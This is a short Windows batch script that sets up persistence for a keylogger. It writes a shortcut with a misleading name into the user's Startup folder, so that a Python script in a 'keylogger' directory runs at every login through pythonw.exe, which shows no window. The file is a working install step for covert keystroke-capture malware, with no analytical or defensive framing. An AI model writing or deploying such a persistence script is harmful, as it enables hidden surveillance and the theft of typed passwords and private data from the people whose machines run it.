@echo off
set username=%USERNAME%
set python_path="C:\Path\to\pythonw.exe"
set script_path="C:\Users\%username%\keylogger\main.py"
set startup_folder="C:\Users\%username%\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup\MyPythonScript.lnk"

powershell "$s=(New-Object -COM WScript.Shell).CreateShortcut('%startup_folder%');$s.TargetPath='%python_path%';$s.Arguments='%script_path%';$s.Save()"

echo Shortcut created successfully!
pause
